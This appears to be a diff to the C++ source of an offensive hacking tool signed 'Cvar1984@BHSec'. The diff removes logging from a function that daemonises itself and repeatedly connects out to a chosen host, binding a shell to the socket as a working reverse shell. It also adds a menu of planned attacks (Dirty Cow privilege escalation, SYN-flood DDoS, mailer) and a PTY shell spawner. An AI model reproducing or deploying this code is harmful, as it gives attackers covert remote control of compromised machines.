@@ -9,8 +9,8 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
-#include <syslog.h>
 #include <string>
+#include <vector>
 
 using std::string;
 using std::vector;
@@ -42,73 +42,105 @@ class Shelter {
      ;     "-,/_..--"`-..__)    
      '""--.._:
 <Cvar1984@BHSec>
+
 )";
         }
 
         void showHelp()
         {
-            cout << "----------" << endl;
-            cout << "desc\t:\t Reverse TCP Connection" << endl;
-            cout << "flag\t:\t -r, --reverse:" << endl;
-            cout << "arg\t:\t -h host -p port -s shell" << endl;
-            cout << "----------" << endl;
-            cout << "desc\t:\t Verbose process" << endl;
-            cout << "flag\t:\t -v, --verbose:" << endl;
-            cout << "----------" << endl;
+            vector<vector<string>> list = {
+                { // desc
+                    "Reverse TCP (Daemon)",
+                    "Gain ROOT (Dirty Cow)",
+                    "SMTP Mailer",
+                    "SYNC Flood (DDOS)",
+                    "Spawn PTY Shell",
+                    "Verbose Informations"
+                },
+                { // flag
+                    "--reverse",
+                    "--root",
+                    "--mail",
+                    "--ddos",
+                    "--spawn",
+                    "--verbose"
+                },
+                { // arg
+                    "-h host -p port -s shell",
+                    "NONE",
+                    "-f from -t to -b body",
+                    "-h host -p port -s size",
+                    "-s shell",
+                    "NONE"
+                }
+            };
+
+            cout << "Usage: [options] [args]" << endl;
+            for(int x = 0; x < (int)list[0].size(); x++) {
+                cout << endl << list[0][x] << endl;
+                cout << "\t" << list[1][x] << endl;
+                cout << "\t" << list[2][x] << endl;
+
+            }
         }
 
-        void reverse(string host, unsigned short port, string shell) {
+        void reverse(string host, unsigned short port, string shell) { 
+            if(this->verbose) {
+                cout << host << ":" << port << " << " << shell << endl;
+            }
+
             struct sockaddr_in sa;
             int s;
             pid_t pid, sid;
-            pid = fork();
+            pid = fork(); // fork process
 
             if(pid > 0) exit(EXIT_SUCCESS);
             else if(pid < 0) exit(EXIT_FAILURE);
             umask(0);
-
-            // Open system logs for the child process
-            openlog("daemon-named", LOG_NOWAIT | LOG_PID, LOG_USER);
-            syslog(LOG_NOTICE, "Successfully started daemon-name");
-
-            // Generate a session ID for the child process
-            sid = setsid();
-            // Ensure a valid SID for the child process
-            if(sid < 0)
-            {
-                // Log failure and exit
-                syslog(LOG_ERR, "Could not generate session ID for child process");
-                exit(EXIT_FAILURE);
-            }
+            sid = setsid(); // generate session id for child
+            if(sid < 0) exit(EXIT_FAILURE);
 
             close(STDIN_FILENO);
             close(STDOUT_FILENO);
             close(STDERR_FILENO);
-            // Daemon-specific intialization should go here
-            const int SLEEP_INTERVAL = 5;
-            // Enter daemon loop
+
             while(1)
             {
-                // Execute daemon heartbeat, where your recurring activity occurs
-                // Sleep for a period of time
+                /** do a magic
+                */
                 sa.sin_family = AF_INET;
                 sa.sin_addr.s_addr = inet_addr(host.c_str());
                 sa.sin_port = htons(port);
-
                 s = socket(AF_INET, SOCK_STREAM, 0);
                 connect(s, (struct sockaddr *)&sa, sizeof(sa));
-                dup2(s, 0); // stdin
-                dup2(s, 1); // stdout
-                dup2(s, 2); // stderr
-
+                dup2(s, 0);
+                dup2(s, 1);
+                dup2(s, 2);
                 execve(shell.c_str(), 0, 0);
-                sleep(SLEEP_INTERVAL);
+                sleep(5);
             }
-            // Close system logs for the child process
-            syslog(LOG_NOTICE, "Stopping daemon-name");
-            closelog();
-            // Terminate the child process when the daemon completes
             exit(EXIT_SUCCESS);
+        }
+
+        void dirtyCow()
+        {
+            cout << "Not available yet" << endl;
+        }
+        void ddos()
+        {
+            cout << "Not available yet" << endl;
+        }
+        void mail()
+        {
+            cout << "Not available yet" << endl;
+        }
+        void spawn(string shell)
+        {
+            string shl = "python -c 'import pty;pty.spawn(\"";
+            shl.append(shell);
+            shl.append("\");'");
+            system(shl.c_str());
+            if(this->verbose) cout << "spawning " << shl << endl;
         }
 };
 #endif
